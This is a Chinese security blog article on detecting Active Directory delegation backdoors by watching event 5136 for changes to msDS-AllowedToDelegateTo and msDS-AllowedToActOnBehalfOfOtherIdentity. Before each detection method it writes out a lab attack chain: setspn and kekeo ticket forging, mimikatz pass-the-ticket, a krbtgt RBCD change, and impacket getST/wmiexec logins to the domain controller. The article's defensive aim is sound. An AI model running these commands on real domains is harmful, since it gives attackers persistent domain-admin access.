---
title: 基于AD Event日志监测域委派后门
url: https://www.secpulse.com/archives/195560.html
source: 安全脉搏
date: 2023-02-09
fetch_date: 2025-10-04T06:04:33.675355
---

# 基于AD Event日志监测域委派后门

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 基于AD Event日志监测域委派后门

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[Bypass007](https://www.secpulse.com/newpage/author?author_id=6275)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-02-08

9,823

**01、简介**

域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。攻击者在获取到域控权限后，可以利用约束委派或者基于资源的约束委派实现后门，以实现达到维持权限的目的。

基于AD Event日志监视对特定 Active Directory 属性的修改，从而发现可疑的域委派后门。

**02、约束委派攻击场景**

假设服务账号配置了到域控的约束性委派，当攻击者控制了服务账号，就可以伪造任意用户的TGT，来打造一个变种的黄金票据。

（1）设置约束委派

```
setspn -U -A cifs/test  test
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827902.png)

（2）构造服务账户test的票据

```
kekeo.exe "tgt::ask /user:test /domain:evil.com /password:abc123! /ticket:test.kirbi" "exit"
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827904.png)

（3）利用伪造的票据，向域服务器申请CIFS服务票据。

```
kekeo.exe "tgs::s4u /tgt:TGT_test@EVIL.COM_krbtgt~evil.com@EVIL.COM.kirbi /user:administrator@evil.com /service:cifs/WIN-DC01" "exit"
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827905.png)

（4）使用mimikatz将该票据注入当前的会话中。

```
mimikatz.exe "kerberos::ptt TGS_administrator@evil.com@EVIL.COM_test@EVIL.COM.kirbi" "exit"
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827906.png)

（5）访问目标共享盘。

```
dir \win-dc01c$
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-16758279061.png)

**检测方法：**攻击手法的核心点在于攻击者需要修改msDS-AllowedToDelegateTo属性，因此我们只需要检测对msDS-AllowedToDelegateTo属性的修改，可以通过5136日志来监控。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827907.png)

安全规则：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827908.png)

**03、基于资源的约束委派攻击场景**

攻击者在获取到域控权限后，可以利用基于资源的约束委派实现后门，通过对krbtgt用户设置委派属性，以实现达到维持权限的目的。

（1）设置属性值并查询

```
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test
Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827909.png)

（2）获取ST，并使用wmiexec登录域控。

```
python getST.py -dc-ip 192.168.44.136 -spn krbtgt -impersonate administrator evil.com/test:abc123!
set KRB5CCNAME=administrator.ccache
python wmiexec.py -no-pass -k administrator@win-dc01 -dc-ip 192.168.44.136
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827910.png)

**检测方法：**攻击手法的核心点在于攻击者需要修改msDS-AllowedToActOnBehalfOfOtherIdentity属性，因此我们只需要检测对msDS-AllowedToActOnBehalfOfOtherIdentity属性的修改，可以通过5136日志来监控。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827914.png)

安全规则：

01![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195560-1675827917.png)1

**本文作者：[Bypass007](newpage/author?author_id=6275)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/195560.html**](https://www.secpulse.com/archives/195560.html)

Tags: [AD Event](https://www.secpulse.com/archives/tag/ad-event)、[后门](https://www.secpulse.com/archives/tag/%E5%90%8E%E9%97%A8)、[域](https://www.secpulse.com/archives/tag/%E5%9F%9F)、[日志](https://www.secpulse.com/archives/tag/%E6%97%A5%E5%BF%97)

点赞：
4
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![TLD与常见文件后缀重复引发的安全问题](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1684736136728-300x188.png)

  TLD与常见文件后缀重复引发的安全问题](https://www.secpulse.com/archives/200803.html "详细阅读 TLD与常见文件后缀重复引发的安全问题")
* [![应急响应 | TeamTNT挖矿木马应急溯源分析](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/03/1679975182208-300x217.png)

  应急响应 | TeamTNT挖矿木马应急…](https://www.secpulse.com/archives/198302.html "详细阅读 应急响应 | TeamTNT挖矿木马应急溯源分析")
* [![基于资源的约束委派（RBCD）](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/01/1673427657021.png)

  基于资源的约束委派（RBCD）](https://www.secpulse.com/archives/194821.html "详细阅读 基于资源的约束委派（RBCD）")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2018/03/535dc13ea81e426db897effda78f9aac-290x290.png)](https://www.secpulse.com/newpage/author?author_id=6275aaa) | [Bypass007 ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](https://www.secpulse.com/newpage/author?author_id=6275) | |
| 文章数：94 | 积分： 218 |
| 一个网络安全爱好者，对技术有着偏执狂一样的追求。 | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)

#### 2020-12-11

[全球敏捷运维峰会（Gdevops2020）](https://w...